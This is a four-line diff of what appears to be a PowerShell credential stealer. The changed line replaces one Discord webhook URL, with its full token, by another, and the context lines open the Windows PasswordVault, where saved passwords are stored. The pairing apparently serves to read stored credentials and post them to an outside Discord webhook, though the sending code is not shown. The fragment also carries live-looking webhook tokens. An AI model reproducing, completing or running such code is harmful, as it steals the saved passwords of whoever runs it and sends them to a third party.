@@ -1,4 +1,4 @@
-$hookUrl = 'https://discord.com/api/webhooks/889662758910574662/aHaHRR3GFmiFr-wD8-RfDzrlfZIOv8P1u-SQL6qrdQmHh3is9s1ZHcL1qxRcd1kDRaYM'
+$hookUrl = 'https://discord.com/api/webhooks/940023056338944041/h2vgzH4bzl0l6fLANvrr6Cc8a_3NTtzM1-Pk1vgzWeGmkbpzDXUSgQCF2SllVRgn4mUa'
 
 [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
 $vault = New-Object Windows.Security.Credentials.PasswordVault
